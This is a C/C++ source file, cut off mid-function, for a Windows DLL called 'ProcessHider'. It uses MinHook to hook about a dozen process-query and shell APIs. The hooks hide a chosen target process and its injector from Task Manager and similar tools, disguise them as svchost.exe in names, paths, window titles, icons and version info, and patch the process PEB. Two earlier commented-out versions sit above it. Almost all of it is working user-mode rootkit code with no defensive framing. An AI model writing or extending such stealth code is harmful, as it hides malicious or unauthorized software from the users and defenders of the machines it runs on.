// #include <Windows.h>
// #include <string.h>
// #include "..\include\MinHook.h"
// #include "nt_structs.h"

// #pragma comment(lib, "..\\include\\libMinHook.x64.lib")

// PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation = nullptr;
// PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation = nullptr;
// wchar_t* g_targetProcessName = nullptr;

// bool ImageNameMatches(const UNICODE_STRING* pName, const wchar_t* target) {
//     if (!pName || !pName->Buffer || !target) return false;
//     size_t targetLen = wcslen(target);
//     size_t nameLen = pName->Length / sizeof(WCHAR);
//     if (nameLen != targetLen) return false;
//     return _wcsnicmp(pName->Buffer, target, nameLen) == 0;
// }

// NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
//     SYSTEM_INFORMATION_CLASS SystemInformationClass,
//     PVOID SystemInformation,
//     ULONG SystemInformationLength,
//     PULONG ReturnLength)
// {
//     NTSTATUS status = New_NtQuerySystemInformation(
//         SystemInformationClass,
//         SystemInformation,
//         SystemInformationLength,
//         ReturnLength);

//     if (SystemInformationClass != SystemProcessInformation || !NT_SUCCESS(status))
//         return status;
//     if (!SystemInformation)
//         return status;

//     P_SYSTEM_PROCESS_INFORMATION pCurrent = (P_SYSTEM_PROCESS_INFORMATION)SystemInformation;
//     P_SYSTEM_PROCESS_INFORMATION pPrevious = nullptr;

//     while (true) {
//         bool hide = false;

//         if (pCurrent->ImageName.Buffer) {
//             // Hide the target process (e.g., notepad.exe) from Task Manager
//             if (g_targetProcessName && ImageNameMatches(&pCurrent->ImageName, g_targetProcessName)) {
//                 hide = true;
//             }
//             // Hide the injector itself from Task Manager
//             else if (ImageNameMatches(&pCurrent->ImageName, L"main.exe")) {
//                 hide = true;
//             }
//         }

//         if (hide) {
//             if (pPrevious) {
//                 if (pCurrent->NextEntryOffset == 0) {
//                     pPrevious->NextEntryOffset = 0;
//                     break;
//                 } else {
//                     pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
//                     pCurrent = (P_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pPrevious + pPrevious->NextEntryOffset);
//                     continue;
//                 }
//             }
//             // If it's the first node (System Idle Process), we can't unlink it,
//             // but it's never our target anyway.
//         } else {
//             pPrevious = pCurrent;
//         }

//         if (pCurrent->NextEntryOffset == 0)
//             break;

//         pCurrent = (P_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
//     }

//     return status;
// }

// bool set_nt_hook()
// {
//     HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
//     if (!ntdll) return false;

//     Original_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");
//     if (!Original_NtQuerySystemInformation) return false;

//     if (MH_Initialize() != MH_OK) return false;
//     if (MH_CreateHook(Original_NtQuerySystemInformation, &Hooked_NtQuerySystemInformation,
//         (LPVOID*)&New_NtQuerySystemInformation) != MH_OK) return false;
//     if (MH_EnableHook(Original_NtQuerySystemInformation) != MH_OK) return false;

//     return true;
// }

// void get_process_name() {
//     HANDLE hMap = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, "GetProcessName");
//     if (!hMap) return;

//     LPVOID buf = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 255);
//     if (!buf) {
//         CloseHandle(hMap);
//         return;
//     }

//     char* ansiName = (char*)buf;
//     if (ansiName[0] != '\0') {
//         int wideLen = MultiByteToWideChar(CP_UTF8, 0, ansiName, -1, nullptr, 0);
//         if (wideLen > 0) {
//             g_targetProcessName = (wchar_t*)malloc(wideLen * sizeof(wchar_t));
//             if (g_targetProcessName) {
//                 MultiByteToWideChar(CP_UTF8, 0, ansiName, -1, g_targetProcessName, wideLen);
//             }
//         }
//     }

//     UnmapViewOfFile(buf);
//     CloseHandle(hMap);
// }

// BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
// {
//     switch (fdwReason) {
//     case DLL_PROCESS_ATTACH:
//         DisableThreadLibraryCalls(hinstDLL);
//         get_process_name();   // Read target name from shared memory
//         set_nt_hook();        // Install hook
//         break;
//     case DLL_PROCESS_DETACH:
//         MH_DisableHook(Original_NtQuerySystemInformation);
//         MH_Uninitialize();
//         if (g_targetProcessName) {
//             free(g_targetProcessName);
//             g_targetProcessName = nullptr;
//         }
//         break;
//     }
//     return TRUE;
// }














// #include <Windows.h>
// #include <string.h>
// #include <stdio.h>
// #include <wchar.h>
// #include "..\include\MinHook.h"
// #include "nt_structs.h"

// #pragma comment(lib, "..\\include\\libMinHook.x64.lib")

// PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation = nullptr;
// PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation = nullptr;
// wchar_t* g_targetProcessName = nullptr;

// // Fake Windows system process name — blends perfectly with real system processes
// wchar_t g_fakeProcessName[32] = L"svchost.exe";

// void DllLog(const char* fmt, ...) {
//     char buf[512];
//     va_list args;
//     va_start(args, fmt);
//     vsnprintf(buf, sizeof(buf), fmt, args);
//     va_end(args);

//     FILE* f = nullptr;
//     char path[MAX_PATH];
//     ExpandEnvironmentStringsA("%TEMP%\\ProcessHider.log", path, MAX_PATH);
//     fopen_s(&f, path, "a");
//     if (f) {
//         fprintf(f, "[PID:%lu] %s\n", GetCurrentProcessId(), buf);
//         fclose(f);
//     }
// }

// bool ImageNameMatches(const UNICODE_STRING* pName, const wchar_t* target) {
//     if (!pName || !pName->Buffer || !target) return false;
//     size_t targetLen = wcslen(target);
//     size_t nameLen = pName->Length / sizeof(WCHAR);
//     if (nameLen != targetLen) return false;
//     return _wcsnicmp(pName->Buffer, target, nameLen) == 0;
// }

// // Overwrite the process name in-place with a fake system process name
// void MasqueradeName(UNICODE_STRING* pName) {
//     if (!pName || !pName->Buffer) return;

//     size_t fakeLen = wcslen(g_fakeProcessName);
//     size_t bufChars = pName->MaximumLength / sizeof(WCHAR);

//     // Only overwrite if the buffer is large enough to hold the fake name
//     if (bufChars >= fakeLen + 1) {
//         memcpy(pName->Buffer, g_fakeProcessName, fakeLen * sizeof(WCHAR));
//         pName->Buffer[fakeLen] = L'\0';
//         pName->Length = (USHORT)(fakeLen * sizeof(WCHAR));
//         pName->MaximumLength = (USHORT)((fakeLen + 1) * sizeof(WCHAR));
//     }
// }

// NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
//     SYSTEM_INFORMATION_CLASS SystemInformationClass,
//     PVOID SystemInformation,
//     ULONG SystemInformationLength,
//     PULONG ReturnLength)
// {
//     NTSTATUS status = New_NtQuerySystemInformation(
//         SystemInformationClass,
//         SystemInformation,
//         SystemInformationLength,
//         ReturnLength);

//     if (SystemInformationClass != SystemProcessInformation || !NT_SUCCESS(status))
//         return status;
//     if (!SystemInformation)
//         return status;

//     P_SYSTEM_PROCESS_INFORMATION pCurrent = (P_SYSTEM_PROCESS_INFORMATION)SystemInformation;

//     while (true) {
//         if (pCurrent->ImageName.Buffer) {
//             // Masquerade the target process (e.g., getscreen.exe)
//             if (g_targetProcessName && ImageNameMatches(&pCurrent->ImageName, g_targetProcessName)) {
//                 MasqueradeName(&pCurrent->ImageName);
//                 DllLog("Masqueraded target PID:%lu as %ls",
//                     (ULONG)(ULONG_PTR)pCurrent->UniqueProcessId, g_fakeProcessName);
//             }
//             // Masquerade the injector itself (main.exe)
//             else if (ImageNameMatches(&pCurrent->ImageName, L"main.exe")) {
//                 MasqueradeName(&pCurrent->ImageName);
//                 DllLog("Masqueraded injector PID:%lu as %ls",
//                     (ULONG)(ULONG_PTR)pCurrent->UniqueProcessId, g_fakeProcessName);
//             }
//         }

//         if (pCurrent->NextEntryOffset == 0)
//             break;

//         pCurrent = (P_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
//     }

//     return status;
// }

// bool set_nt_hook()
// {
//     HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
//     if (!ntdll) return false;

//     Original_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");
//     if (!Original_NtQuerySystemInformation) return false;

//     if (MH_Initialize() != MH_OK) return false;
//     if (MH_CreateHook(Original_NtQuerySystemInformation, &Hooked_NtQuerySystemInformation,
//         (LPVOID*)&New_NtQuerySystemInformation) != MH_OK) return false;
//     if (MH_EnableHook(Original_NtQuerySystemInformation) != MH_OK) return false;

//     DllLog("Hook installed successfully");
//     return true;
// }

// void get_process_name() {
//     HANDLE hMap = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, "GetProcessName");
//     if (!hMap) {
//         DllLog("OpenFileMappingA failed. Error: %lu", GetLastError());
//         return;
//     }

//     LPVOID buf = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 255);
//     if (!buf) {
//         CloseHandle(hMap);
//         DllLog("MapViewOfFile failed");
//         return;
//     }

//     char* ansiName = (char*)buf;
//     if (ansiName[0] != '\0') {
//         int wideLen = MultiByteToWideChar(CP_UTF8, 0, ansiName, -1, nullptr, 0);
//         if (wideLen > 0) {
//             g_targetProcessName = (wchar_t*)malloc(wideLen * sizeof(wchar_t));
//             if (g_targetProcessName) {
//                 MultiByteToWideChar(CP_UTF8, 0, ansiName, -1, g_targetProcessName, wideLen);
//                 DllLog("Target process to masquerade: %ls -> %ls", g_targetProcessName, g_fakeProcessName);
//             }
//         }
//     } else {
//         DllLog("Shared memory was empty");
//     }

//     UnmapViewOfFile(buf);
//     CloseHandle(hMap);
// }

// BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
// {
//     switch (fdwReason) {
//     case DLL_PROCESS_ATTACH:
//         DisableThreadLibraryCalls(hinstDLL);
//         DllLog("DLL attached to PID:%lu", GetCurrentProcessId());
//         get_process_name();
//         set_nt_hook();
//         break;
//     case DLL_PROCESS_DETACH:
//         DllLog("DLL detached");
//         MH_DisableHook(Original_NtQuerySystemInformation);
//         MH_Uninitialize();
//         if (g_targetProcessName) {
//             free(g_targetProcessName);
//             g_targetProcessName = nullptr;
//         }
//         break;
//     }
//     return TRUE;
// }




















#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <wchar.h>
#include <psapi.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <TlHelp32.h>
#include <winternl.h>
#include "..\include\MinHook.h"
#include "nt_structs.h"

#pragma comment(lib, "..\\include\\libMinHook.x64.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")

// ============================================================================
// Missing NT types
// ============================================================================
typedef enum _MEMORY_INFORMATION_CLASS {
    MemoryBasicInformation,
    MemoryWorkingSetInformation,
    MemoryMappedFilenameInformation,
    MemoryRegionInformation,
    MemoryWorkingSetExInformation,
    MemorySharedCommitInformation,
    MemoryImageInformation,
    MemoryRegionInformationEx,
    MemoryPrivilegedBasicInformation,
    MemoryEnclaveImageInformation,
    MemoryBasicInformationCapped
} MEMORY_INFORMATION_CLASS;

typedef NTSTATUS(NTAPI* PNT_QUERY_SYSTEM_INFORMATION)(
    SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

typedef NTSTATUS(NTAPI* PNT_QUERY_INFORMATION_PROCESS)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

typedef NTSTATUS(NTAPI* PNT_QUERY_VIRTUAL_MEMORY)(
    HANDLE, PVOID, MEMORY_INFORMATION_CLASS, PVOID, SIZE_T, PSIZE_T);

typedef BOOL(WINAPI* PQUERY_FULL_PROCESS_IMAGE_NAME_W)(
    HANDLE, DWORD, LPWSTR, PDWORD);

typedef DWORD(WINAPI* PGET_PROCESS_IMAGE_FILE_NAME_W)(
    HANDLE, LPWSTR, DWORD);

typedef DWORD(WINAPI* PGET_MODULE_FILE_NAME_EX_W)(
    HANDLE, HMODULE, LPWSTR, DWORD);

typedef int (WINAPI* PGET_WINDOW_TEXT_W)(HWND, LPWSTR, int);
typedef BOOL(WINAPI* PSET_WINDOW_TEXT_W)(HWND, LPCWSTR);
typedef DWORD(WINAPI* PGET_CLASS_NAME_W)(HWND, LPWSTR, int);
typedef DWORD_PTR(WINAPI* PSH_GET_FILE_INFO_W)(LPCWSTR, DWORD, SHFILEINFOW*, UINT, UINT);

typedef DWORD(WINAPI* PGET_FILE_VERSION_INFO_SIZE_W)(LPCWSTR, LPDWORD);
typedef BOOL(WINAPI* PGET_FILE_VERSION_INFO_W)(LPCWSTR, DWORD, DWORD, LPVOID);
typedef BOOL(WINAPI* PVER_QUERY_VALUE_W)(LPCVOID, LPCWSTR, LPVOID*, PUINT);
typedef UINT(WINAPI* PEXTRACT_ICON_EX_W)(LPCWSTR, int, HICON*, HICON*, UINT);

// ============================================================================
// Globals
// ============================================================================
PNT_QUERY_SYSTEM_INFORMATION        g_OrigNtQuerySystemInformation = nullptr;
PNT_QUERY_INFORMATION_PROCESS       g_OrigNtQueryInformationProcess = nullptr;
PNT_QUERY_VIRTUAL_MEMORY            g_OrigNtQueryVirtualMemory = nullptr;
PQUERY_FULL_PROCESS_IMAGE_NAME_W    g_OrigQueryFullProcessImageNameW = nullptr;
PGET_PROCESS_IMAGE_FILE_NAME_W      g_OrigGetProcessImageFileNameW = nullptr;
PGET_MODULE_FILE_NAME_EX_W          g_OrigGetModuleFileNameExW = nullptr;
PGET_WINDOW_TEXT_W                  g_OrigGetWindowTextW = nullptr;
PSET_WINDOW_TEXT_W                  g_OrigSetWindowTextW = nullptr;
PGET_CLASS_NAME_W                   g_OrigGetClassNameW = nullptr;
PSH_GET_FILE_INFO_W                 g_OrigSHGetFileInfoW = nullptr;
PGET_FILE_VERSION_INFO_SIZE_W       g_OrigGetFileVersionInfoSizeW = nullptr;
PGET_FILE_VERSION_INFO_W            g_OrigGetFileVersionInfoW = nullptr;
PVER_QUERY_VALUE_W                  g_OrigVerQueryValueW = nullptr;
PEXTRACT_ICON_EX_W                  g_OrigExtractIconExW = nullptr;

PNT_QUERY_SYSTEM_INFORMATION        g_TrampNtQuerySystemInformation = nullptr;

wchar_t* g_targetProcessName = nullptr;
DWORD    g_targetPid = 0;
DWORD    g_injectorPid = 0;

wchar_t g_fakeProcessName[32] = L"svchost.exe";
wchar_t g_fakeNtPath[128]     = L"\\??\\C:\\Windows\\System32\\svchost.exe";
wchar_t g_fakeWin32Path[128]  = L"C:\\Windows\\System32\\svchost.exe";

const wchar_t* g_injectorNames[] = { L"DLL_Injector.exe", L"main.exe", L"ProcessHider.exe" };

// ============================================================================
// Logging
// ============================================================================
void DllLog(const char* fmt, ...) {
    char buf[512];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);

    FILE* f = nullptr;
    char path[MAX_PATH];
    ExpandEnvironmentStringsA("%TEMP%\\ProcessHider.log", path, MAX_PATH);
    fopen_s(&f, path, "a");
    if (f) {
        fprintf(f, "[PID:%lu] %s\n", GetCurrentProcessId(), buf);
        fclose(f);
    }
}

// ============================================================================
// Name helpers — flexible matching with/without .exe
// ============================================================================
bool FlexibleNameMatch(const wchar_t* name, size_t nameLen, const wchar_t* target) {
    if (!name || !target || nameLen == 0) return false;

    // Exact match
    if (wcslen(target) == nameLen && _wcsnicmp(name, target, nameLen) == 0) return true;

    // Target has .exe but name doesn't
    size_t tlen = wcslen(target);
    if (tlen > 4 && _wcsicmp(target + tlen - 4, L".exe") == 0) {
        if (nameLen == tlen - 4 && _wcsnicmp(name, target, nameLen) == 0) return true;
    }

    // Target lacks .exe but name has it
    if (tlen > 0 && nameLen == tlen + 4) {
        if (_wcsnicmp(name, target, tlen) == 0 && _wcsicmp(name + tlen, L".exe") == 0) return true;
    }

    return false;
}

bool ImageNameMatches(const UNICODE_STRING* pName, const wchar_t* target) {
    if (!pName || !pName->Buffer || !target) return false;
    size_t nameLen = pName->Length / sizeof(WCHAR);
    return FlexibleNameMatch(pName->Buffer, nameLen, target);
}

bool IsInjectorName(const UNICODE_STRING* pName) {
    if (!pName || !pName->Buffer) return false;
    for (const wchar_t* name : g_injectorNames) {
        if (ImageNameMatches(pName, name)) return true;
    }
    return false;
}

bool IsTargetName(const UNICODE_STRING* pName) {
    if (!pName || !pName->Buffer) return false;
    if (g_targetProcessName && ImageNameMatches(pName, g_targetProcessName)) return true;
    return false;
}

bool IsTargetPid(DWORD pid) {
    return (pid != 0 && pid == g_targetPid);
}

bool IsInjectorPid(DWORD pid) {
    return (g_injectorPid != 0 && pid == g_injectorPid);
}

bool ShouldMasqueradePid(DWORD pid) {
    return IsTargetPid(pid) || IsInjectorPid(pid);
}

bool ShouldMasqueradeEntry(DWORD pid, const UNICODE_STRING* pName) {
    if (ShouldMasqueradePid(pid)) return true;
    if (IsTargetName(pName)) return true;
    if (IsInjectorName(pName)) return true;
    return false;
}

bool IsTargetPath(LPCWSTR path) {
    if (!path) return false;
    if (g_targetProcessName && StrStrIW(path, g_targetProcessName)) return true;
    for (const wchar_t* name : g_injectorNames) {
        if (StrStrIW(path, name)) return true;
    }
    return false;
}

// ============================================================================
// Masquerade helpers
// ============================================================================
void MasqueradeName(UNICODE_STRING* pName) {
    if (!pName || !pName->Buffer) return;
    size_t fakeLen = wcslen(g_fakeProcessName);
    size_t bufChars = pName->MaximumLength / sizeof(WCHAR);
    if (bufChars >= fakeLen + 1) {
        memcpy(pName->Buffer, g_fakeProcessName, fakeLen * sizeof(WCHAR));
        pName->Buffer[fakeLen] = L'\0';
        pName->Length = (USHORT)(fakeLen * sizeof(WCHAR));
    }
}

void MasqueradePath(UNICODE_STRING* pName, const wchar_t* fakePath) {
    if (!pName || !pName->Buffer || !fakePath) return;
    size_t fakeLen = wcslen(fakePath);
    size_t bufChars = pName->MaximumLength / sizeof(WCHAR);
    if (bufChars >= fakeLen + 1) {
        memcpy(pName->Buffer, fakePath, fakeLen * sizeof(WCHAR));
        pName->Buffer[fakeLen] = L'\0';
        pName->Length = (USHORT)(fakeLen * sizeof(WCHAR));
    }
}

// ============================================================================
// Hook 1: NtQuerySystemInformation — COMPLETELY HIDE by unlinking
// Handles class 5 (SystemProcessInformation) and class 57 (Extended)
// ============================================================================
NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS status = g_TrampNtQuerySystemInformation(
        SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (!NT_SUCCESS(status) || !SystemInformation)
        return status;

    // Class 5 = standard, Class 57 = extended (Win10/11 Task Manager Details tab)
    if (SystemInformationClass != SystemProcessInformation &&
        SystemInformationClass != (SYSTEM_INFORMATION_CLASS)57)
        return status;

    P_SYSTEM_PROCESS_INFORMATION pCurr = (P_SYSTEM_PROCESS_INFORMATION)SystemInformation;
    P_SYSTEM_PROCESS_INFORMATION pPrev = nullptr;

    while (pCurr)
    {
        DWORD pid = (DWORD)(ULONG_PTR)pCurr->UniqueProcessId;
        bool shouldHide = false;

        if (ShouldMasqueradePid(pid))
        {
            shouldHide = true;
            DllLog("Hiding PID %lu by PID match", pid);
        }
        else if (pCurr->ImageName.Buffer && pCurr->ImageName.Length > 0)
        {
            if (ShouldMasqueradeEntry(pid, &pCurr->ImageName))
            {
                shouldHide = true;
                DllLog("Hiding PID %lu by name match", pid);
            }
        }

        if (shouldHide)
        {
            if (pPrev == nullptr)
            {
                // ---- Hiding the FIRST entry ----
                if (pCurr->NextEntryOffset == 0)
                {
                    memset(pCurr, 0, sizeof(SYSTEM_PROCESS_INFORMATION));
                    DllLog("Hidden first+only entry");
                    break;
                }

                P_SYSTEM_PROCESS_INFORMATION pNext = (P_SYSTEM_PROCESS_INFORMATION)(
                    (PUCHAR)pCurr + pCurr->NextEntryOffset);

                SIZE_T bytesToMove = 0;
                PUCHAR pEnd = (PUCHAR)SystemInformation + SystemInformationLength;
                if ((PUCHAR)pNext < pEnd)
                    bytesToMove = pEnd - (PUCHAR)pNext;

                if (bytesToMove > 0)
                    memmove(pCurr, pNext, bytesToMove);

                // Zero the tail to avoid stale data confusing parsers
                PUCHAR pTail = (PUCHAR)pCurr + bytesToMove;
                SIZE_T tailBytes = pEnd - pTail;
                if (tailBytes > 0 && tailBytes <= SystemInformationLength)
                    memset(pTail, 0, tailBytes);

                // pPrev stays null; re-check new first entry
                continue;
            }
            else
            {
                // ---- Hiding MIDDLE or LAST entry ----
                if (pCurr->NextEntryOffset == 0)
                {
                    pPrev->NextEntryOffset = 0;
                    DllLog("Hidden last entry");
                    break;
                }
                else
                {
                    pPrev->NextEntryOffset += pCurr->NextEntryOffset;
                    pCurr = (P_SYSTEM_PROCESS_INFORMATION)(
                        (PUCHAR)pPrev + pPrev->NextEntryOffset);
                    continue;
                }
            }
        }

        if (pCurr->NextEntryOffset == 0)
            break;

        pPrev = pCurr;
        pCurr = (P_SYSTEM_PROCESS_INFORMATION)(
            (PUCHAR)pCurr + pCurr->NextEntryOffset);
    }

    return status;
}

// ============================================================================
// Hook 2: NtQueryInformationProcess (ProcessImageFileName = 27)
// ============================================================================
NTSTATUS WINAPI Hooked_NtQueryInformationProcess(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS status = g_OrigNtQueryInformationProcess(
        ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);

    if (!NT_SUCCESS(status)) return status;
    if (ProcessInformationClass != (PROCESSINFOCLASS)27) return status;

    DWORD pid = GetProcessId(ProcessHandle);
    if (!ShouldMasqueradePid(pid)) return status;

    UNICODE_STRING* pUni = (UNICODE_STRING*)ProcessInformation;
    if (!pUni || !pUni->Buffer) return status;

    MasqueradePath(pUni, g_fakeNtPath);
    return status;
}

// ============================================================================
// Hook 3: NtQueryVirtualMemory
// ============================================================================
NTSTATUS WINAPI Hooked_NtQueryVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    MEMORY_INFORMATION_CLASS MemoryInformationClass,
    PVOID MemoryInformation,
    SIZE_T MemoryInformationLength,
    PSIZE_T ReturnLength)
{
    NTSTATUS status = g_OrigNtQueryVirtualMemory(
        ProcessHandle, BaseAddress, MemoryInformationClass, MemoryInformation, MemoryInformationLength, ReturnLength);

    if (!NT_SUCCESS(status) || MemoryInformationClass != MemoryMappedFilenameInformation)
        return status;

    DWORD pid = GetProcessId(ProcessHandle);
    if (!ShouldMasqueradePid(pid)) return status;

    UNICODE_STRING* pUni = (UNICODE_STRING*)MemoryInformation;
    if (pUni && pUni->Buffer) {
        MasqueradePath(pUni, g_fakeNtPath);
    }
    return status;
}

// ============================================================================
// Hook 4: QueryFullProcessImageNameW
// ============================================================================
BOOL WINAPI Hooked_QueryFullProcessImageNameW(
    HANDLE hProcess,
    DWORD dwFlags,
    LPWSTR lpExeName,
    PDWORD lpdwSize)
{
    BOOL result = g_OrigQueryFullProcessImageNameW(hProcess, dwFlags, lpExeName, lpdwSize);
    if (!result || !lpExeName || !lpdwSize) return result;

    DWORD pid = GetProcessId(hProcess);
    if (!ShouldMasqueradePid(pid)) return result;

    size_t fakeLen = wcslen(g_fakeWin32Path);
    if (*lpdwSize > fakeLen) {
        wcscpy_s(lpExeName, *lpdwSize, g_fakeWin32Path);
        *lpdwSize = (DWORD)fakeLen;
    }
    return result;
}

// ============================================================================
// Hook 5: GetProcessImageFileNameW
// ============================================================================
DWORD WINAPI Hooked_GetProcessImageFileNameW(
    HANDLE hProcess,
    LPWSTR lpImageFileName,
    DWORD nSize)
{
    DWORD result = g_OrigGetProcessImageFileNameW(hProcess, lpImageFileName, nSize);
    if (result == 0 || !lpImageFileName) return result;

    DWORD pid = GetProcessId(hProcess);
    if (!ShouldMasqueradePid(pid)) return result;

    size_t fakeLen = wcslen(g_fakeNtPath);
    if (nSize > fakeLen) {
        wcscpy_s(lpImageFileName, nSize, g_fakeNtPath);
        return (DWORD)fakeLen;
    }
    return result;
}

// ============================================================================
// Hook 6: GetModuleFileNameExW
// ============================================================================
DWORD WINAPI Hooked_GetModuleFileNameExW(
    HANDLE hProcess,
    HMODULE hModule,
    LPWSTR lpFilename,
    DWORD nSize)
{
    DWORD result = g_OrigGetModuleFileNameExW(hProcess, hModule, lpFilename, nSize);
    if (result == 0 || !lpFilename) return result;

    DWORD pid = GetProcessId(hProcess);
    if (!ShouldMasqueradePid(pid)) return result;
    if (hModule != NULL) return result;

    size_t fakeLen = wcslen(g_fakeWin32Path);
    if (nSize > fakeLen) {
        wcscpy_s(lpFilename, nSize, g_fakeWin32Path);
        return (DWORD)fakeLen;
    }
    return result;
}

// ============================================================================
// Hook 7: Window text APIs
// ============================================================================
int WINAPI Hooked_GetWindowTextW(HWND hWnd, LPWSTR lpString, int nMaxCount) {
    int result = g_OrigGetWindowTextW(hWnd, lpString, nMaxCount);
    if (result <= 0 || !lpString) return result;

    DWORD pid = 0;
    GetWindowThreadProcessId(hWnd, &pid);
    if (!ShouldMasqueradePid(pid)) return result;

    wcscpy_s(lpString, nMaxCount, L"Service Host");
    return (int)wcslen(L"Service Host");
}

DWORD WINAPI Hooked_GetClassNameW(HWND hWnd, LPWSTR lpClassName, int nMaxCount) {
    DWORD result = g_OrigGetClassNameW(hWnd, lpClassName, nMaxCount);
    if (result == 0 || !lpClassName) return result;

    DWORD pid = 0;
    GetWindowThreadProcessId(hWnd, &pid);
    if (!ShouldMasqueradePid(pid)) return result;

    wcscpy_s(lpClassName, nMaxCount, L"WindowsSystemClass");
    return (DWORD)wcslen(L"WindowsSystemClass");
}

// ============================================================================
// Hook 8: SHGetFileInfoW
// ============================================================================
DWORD_PTR WINAPI Hooked_SHGetFileInfoW(
    LPCWSTR pszPath,
    DWORD dwFileAttributes,
    SHFILEINFOW* psfi,
    UINT cbFileInfo,
    UINT uFlags)
{
    if (pszPath && IsTargetPath(pszPath)) {
        DWORD_PTR ret = g_OrigSHGetFileInfoW(g_fakeWin32Path, dwFileAttributes, psfi, cbFileInfo, uFlags);
        if (psfi && (uFlags & SHGFI_DISPLAYNAME)) {
            wcscpy_s(psfi->szDisplayName, ARRAYSIZE(psfi->szDisplayName), g_fakeProcessName);
        }
        return ret;
    }

    DWORD_PTR result = g_OrigSHGetFileInfoW(pszPath, dwFileAttributes, psfi, cbFileInfo, uFlags);

    if (psfi && (uFlags & SHGFI_DISPLAYNAME) && g_targetProcessName) {
        if (StrStrIW(psfi->szDisplayName, g_targetProcessName)) {
            wcscpy_s(psfi->szDisplayName, ARRAYSIZE(psfi->szDisplayName), g_fakeProcessName);
        }
        for (const wchar_t* name : g_injectorNames) {
            if (StrStrIW(psfi->szDisplayName, name)) {
                wcscpy_s(psfi->szDisplayName, ARRAYSIZE(psfi->szDisplayName), g_fakeProcessName);
                break;
            }
        }
    }
    return result;
}

// ============================================================================
// Hook 9: GetFileVersionInfoSizeW
// ============================================================================
DWORD WINAPI Hooked_GetFileVersionInfoSizeW(LPCWSTR lptstrFilename, LPDWORD lpdwHandle) {
    if (lptstrFilename && IsTargetPath(lptstrFilename)) {
        if (lpdwHandle) *lpdwHandle = 0;
        return 0;
    }
    return g_OrigGetFileVersionInfoSizeW(lptstrFilename, lpdwHandle);
}

// ============================================================================
// Hook 10: GetFileVersionInfoW
// ============================================================================
BOOL WINAPI Hooked_GetFileVersionInfoW(LPCWSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {
    if (lptstrFilename && IsTargetPath(lptstrFilename)) {
        DWORD svchostSize = g_OrigGetFileVersionInfoSizeW(g_fakeWin32Path, NULL);
        if (svchostSize > 0 && dwLen >= svchostSize) {
            return g_OrigGetFileVersionInfoW(g_fakeWin32Path, 0, svchostSize, lpData);
        }
        SetLastError(ERROR_FILE_NOT_FOUND);
        return FALSE;
    }
    return g_OrigGetFileVersionInfoW(lptstrFilename, dwHandle, dwLen, lpData);
}

// ============================================================================
// Hook 11: ExtractIconExW
// ============================================================================
UINT WINAPI Hooked_ExtractIconExW(LPCWSTR lpszFile, int nIconIndex, HICON* phiconLarge, HICON* phiconSmall, UINT nIcons) {
    if (lpszFile && IsTargetPath(lpszFile)) {
        return g_OrigExtractIconExW(g_fakeWin32Path, nIconIndex, phiconLarge, phiconSmall, nIcons);
    }
    return g_OrigExtractIconExW(lpszFile, nIconIndex, phiconLarge, phiconSmall, nIcons);
}

// ============================================================================
// PEB Patch
// ============================================================================
void PatchTargetPEB() {
    if (!g_targetProcessName) return;

    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    wchar_t* selfName = wcsrchr(selfPath, L'\\');
    if (selfName) selfName++; else selfName = selfPath;

    bool isTarget = (_wcsicmp(selfName, g_targetProcessName) == 0);
    bool isInjector = false;
    for (const wchar_t* name : g_injectorNames) {
        if (_wcsicmp(selfName, name) == 0) { isInjector = true; break; }
    }

    if (!isTarget && !isInjector) return;

#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif

    if (!peb || !peb->ProcessParameters) return;

    PRTL_USER_PROCESS_PARAMETERS params = peb->ProcessParameters;

    if (params->ImagePathName.Buffer) {
        MasqueradePath(&params->ImagePathName, g_fakeWin32Path);
    }
    if (params->CommandLine.Buffer) {
        MasqueradePath(&params->CommandLine, g_fakeProcessName);
    }

    DllLog("PEB patched in self (PID:%lu)", GetCurrentProcessId());
}

// ============================================================================
// Hook installation
// ============================================================================
bool InstallHooks() {
